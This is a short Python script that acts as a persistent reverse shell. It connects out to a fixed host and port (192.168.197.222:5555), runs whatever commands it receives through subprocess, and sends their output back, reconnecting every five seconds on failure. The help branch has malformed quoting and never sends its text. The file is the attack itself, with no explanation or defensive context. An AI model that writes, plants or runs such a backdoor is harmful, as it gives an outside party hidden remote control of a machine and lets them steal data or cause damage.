import socket
import subprocess
import time

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.197.222", 5555))
    while True:
        command = s.recv(1024).decode("utf-8")
        if command == "info":
            s.send("help command1 command2 command3".encode("utf-8"))
        elif command == "help":
            help_text = """Available commands:\n"
					  help - Display this help message\n"
					  command1 - Description of command 1\n
					  command2 - Description of command 2\n
					  command3 - Description of command 3\n"""   
        else:
            output = subprocess.getoutput(command)
            s.send(output.encode("utf-8"))
    s.close()

if __name__ == "__main__":
    while True:
        try:
            connect()
        except Exception as e:
            time.sleep(5)